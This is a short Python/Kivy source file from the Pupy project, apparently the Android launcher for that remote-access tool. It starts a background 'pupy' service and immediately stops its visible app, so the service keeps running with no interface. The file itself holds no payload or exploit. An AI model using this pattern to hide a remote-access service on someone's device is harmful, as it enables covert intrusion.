#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import os
os.environ['KIVY_NO_FILELOG']='yes'

from kivy.app import App
from kivy.lang import Builder
from kivy.utils import platform
import time
import os
kv = ""
#Button:
#	text: 'push me!'

class ServiceApp(App):
	def build(self):
		if platform == 'android':
			from android import AndroidService
			service = AndroidService('pupy', 'running')
			service.start('service started')
			self.service = service
			App.get_running_app().stop()
		return Builder.load_string(kv)

if __name__ == '__main__':
	ServiceApp().run()

